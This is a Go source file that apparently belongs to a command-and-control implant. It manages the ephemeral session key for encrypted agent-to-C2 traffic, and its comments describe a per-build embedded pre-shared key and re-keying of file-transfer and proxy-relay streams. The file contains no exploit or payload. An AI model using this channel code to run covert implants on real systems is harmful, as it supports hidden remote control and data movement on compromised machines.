package c2transport

import (
	"crypto/subtle"
	"sync"
	"sync/atomic"
)

// currentSessionKey is the ephemeral PFS session key negotiated with the C2 on
// the message tunnel.
//
// The C2 protocol is bootstrapped with a static per-build PSK derived from the
// embedded MagicString (def.AESPassword): the check-in stream and the first
// message-tunnel handshake are encrypted with it. As soon as the ECDH
// handshake completes, the tunnel switches to the derived ephemeral session
// key, and so does EVERY subsequent agent↔C2 stream (FTP uploads, WWW
// downloads, proxy relay, ...): EstablishC2Connection re-keys auxiliary
// streams right after their MsgAuth envelope.
//
// The key is refcounted: every auxiliary stream that captures it holds a
// reference for as long as it may still write, so a message-tunnel teardown
// (which clears the "current" key so reconnect/check-in uses the static PSK)
// can never yank the key out from under an in-flight relay. Without this, the
// teardown could race an auxiliary EstablishC2Connection: the relay would read
// nil right after the tunnel closed and silently fall back to the PSK while
// the C2 still re-keyed the stream with the PFS key, producing an
// intermittent "SecureConn: decryption failed" / EOF on the very first relayed
// bytes.
var (
	sessionKeyMu      sync.RWMutex
	currentSessionKey []byte
	sessionKeyRefs    atomic.Int64
)

// acquireSessionKey returns the active ephemeral PFS session key (or nil when
// no message-tunnel session is established) and increments the reference count.
// The caller must call releaseSessionKey when it no longer needs the key.
func acquireSessionKey() []byte {
	sessionKeyMu.RLock()
	key := currentSessionKey
	if key != nil {
		// Keep the key alive across the caller's use even if the message
		// tunnel tears down and clears currentSessionKey in the meantime.
		sessionKeyRefs.Add(1)
		cpy := make([]byte, len(key))
		copy(cpy, key)
		sessionKeyMu.RUnlock()
		return cpy
	}
	sessionKeyMu.RUnlock()
	return nil
}

// releaseSessionKey decrements the reference count held by an auxiliary stream.
func releaseSessionKey() {
	sessionKeyRefs.Add(-1)
}

// setCurrentSessionKey publishes the ephemeral PFS session key established by
// the message-tunnel handshake. A defensive copy is kept so callers can
// freely reuse/zero their buffer afterwards.
func setCurrentSessionKey(key []byte) {
	sessionKeyMu.Lock()
	defer sessionKeyMu.Unlock()
	if len(key) == 0 {
		currentSessionKey = nil
		return
	}
	cpy := make([]byte, len(key))
	copy(cpy, key)
	currentSessionKey = cpy
}

// clearCurrentSessionKey drops the ephemeral session key. It is called when
// the message tunnel closes so no post-session stream accidentally encrypts
// with a dead session key. In-flight auxiliary streams that already acquired
// the key keep their copy until they release it.
func clearCurrentSessionKey() {
	sessionKeyMu.Lock()
	defer sessionKeyMu.Unlock()
	currentSessionKey = nil
}

// clearCurrentSessionKeyIf drops the ephemeral session key only when it still
// matches the given key. It lets a closing message tunnel clear the key it
// negotiated without wiping a newer key that a racing reconnect (or another
// in-process tunnel) has already installed: the newer session's auxiliary
// streams must keep re-keying with the current PFS key, or their first frame
// fails to decrypt on the C2 side.
func clearCurrentSessionKeyIf(key []byte) {
	sessionKeyMu.Lock()
	defer sessionKeyMu.Unlock()
	if len(key) == 0 {
		return
	}
	if len(currentSessionKey) == len(key) && subtle.ConstantTimeCompare(currentSessionKey, key) == 1 {
		currentSessionKey = nil
	}
}

// getCurrentSessionKey returns the active ephemeral PFS session key, or nil
// when no message-tunnel session is established yet. Prefer acquireSessionKey
// / releaseSessionKey when the key will be used beyond the immediate call.
func getCurrentSessionKey() []byte {
	sessionKeyMu.RLock()
	defer sessionKeyMu.RUnlock()
	return currentSessionKey
}
